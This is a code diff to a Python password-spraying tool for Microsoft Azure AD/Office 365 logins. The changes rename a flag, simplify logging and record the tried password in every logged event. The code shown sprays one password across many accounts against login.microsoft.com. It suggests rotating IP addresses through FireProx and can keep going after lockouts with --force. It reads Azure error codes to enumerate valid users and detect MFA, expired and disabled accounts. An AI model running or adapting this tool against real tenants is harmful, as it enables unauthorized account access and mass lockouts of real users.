@@ -22,7 +22,7 @@ This command uses the specified FireProx URL to spray from randomized IP address
 """
 parser = argparse.ArgumentParser(description=description, epilog=epilog, formatter_class=argparse.RawDescriptionHelpFormatter)
 
-parser.add_argument("-u", "--userlist", metavar="FILE", required=True, help="File filled with usernames one-per-line in the format 'user@domain.com'. (Required)")
+parser.add_argument("-U", "--userlist", metavar="FILE", required=True, help="File filled with usernames one-per-line in the format 'user@domain.com'. (Required)")
 parser.add_argument("-p", "--password", required=True, help="A single password that will be used to perform the password spray. (Required)")
 parser.add_argument("-f", "--force", action='store_true', help="Forces the spray to continue and not stop when multiple account lockouts are detected.")
 parser.add_argument("--url", default="https://login.microsoft.com", help="The URL to spray against (default is https://login.microsoft.com). Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.")
@@ -90,7 +90,7 @@ for username in usernames:
             sys.exit(1)
 
     username_counter += 1
-    LOGGER.info(f"{username_counter} of {username_count} users tested", end="\r")
+    LOGGER.info(f"{username_counter} of {username_count} users tested")
 
     if userAsPass:
         body = {
@@ -124,54 +124,53 @@ for username in usernames:
 
     if r.status_code == 200:
         LOGGER.info(f"SUCCESS! {username} : {password}")
-        log_event(subject=username, target="https://graph.windows.net", status="success",  ip=ip, details="")
+        log_event(subject=username, password=password, target="https://graph.windows.net", status="success",  ip=ip, details="")
     else:
         resp = r.json()
         error = resp["error_description"]
 
         if "AADSTS50126" in error:
-            if verbose:
-                LOGGER.error(f"VERBOSE: Invalid username or password. Username: {username} could exist.")
-                log_event(subject=username, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50126")
+            LOGGER.error(f"ERROR!: Invalid username or password. Username: {username} could exist.")
+            log_event(subject=username, password=password, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50126")
 
         elif "AADSTS50128" in error or "AADSTS50059" in error:
             LOGGER.error(f"WARNING! Tenant for account {username} doesn't exist. Check the domain to make sure they are using Azure/O365 services.")
-            log_event(subject=username, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50128")
+            log_event(subject=username, password=password, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50128")
             
         elif "AADSTS50034" in error:
             LOGGER.error(f"WARNING! The user {username} doesn't exist.")
-            log_event(subject=username, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50034")
+            log_event(subject=username, password=password, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50034")
                         
         elif "AADSTS50079" in error or "AADSTS50076" in error:
             # Microsoft MFA response
             LOGGER.info(f"SUCCESS! {username} : {password} - NOTE: The response indicates MFA (Microsoft) is in use.")
-            log_event(subject=username, target="https://graph.windows.net", status="success",  ip=ip, details="The response indicates MFA (Microsoft) is in use.")
+            log_event(subject=username, password=password, target="https://graph.windows.net", status="success",  ip=ip, details="The response indicates MFA (Microsoft) is in use.")
             
         elif "AADSTS50158" in error:
             # Conditional Access response (Based off of limited testing this seems to be the response to DUO MFA)
             LOGGER.info(f"SUCCESS! {username} : {password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.")
-            log_event(subject=username, target="https://graph.windows.net", status="success",  ip=ip, details="The response indicates conditional access (MFA: DUO or other) is in use.")
+            log_event(subject=username, password=password, target="https://graph.windows.net", status="success",  ip=ip, details="The response indicates conditional access (MFA: DUO or other) is in use.")
             
         elif "AADSTS50053" in error:
             # Locked out account or Smart Lockout in place
             LOGGER.error(f"WARNING! The account {username} appears to be locked.")
-            log_event(subject=username, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50053")
+            log_event(subject=username, password=password, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50053")
             lockout_counter += 1
             
         elif "AADSTS50057" in error:
             # Disabled account
             LOGGER.error(f"WARNING! The account {username} appears to be disabled.")
-            log_event(subject=username, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50057")
+            log_event(subject=username, password=password, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50057")
             
         elif "AADSTS50055" in error:
             # User password is expired
             LOGGER.info(f"SUCCESS! {username} : {password} - NOTE: The user's password is expired.")
-            log_event(subject=username, target="https://graph.windows.net", status="success",  ip=ip, details="AADSTS50055")
+            log_event(subject=username, password=password, target="https://graph.windows.net", status="success",  ip=ip, details="AADSTS50055")
             
         else:
             # Unknown errors
             LOGGER.error(f"Got an error we haven't seen yet for user {username}")
-            log_event(subject=username, target="https://graph.windows.net", status="fail",  ip=ip, details="Got an error we haven't seen yet for user.")
+            log_event(subject=username, password=password, target="https://graph.windows.net", status="fail",  ip=ip, details="Got an error we haven't seen yet for user.")
             LOGGER.error(error)
             
 
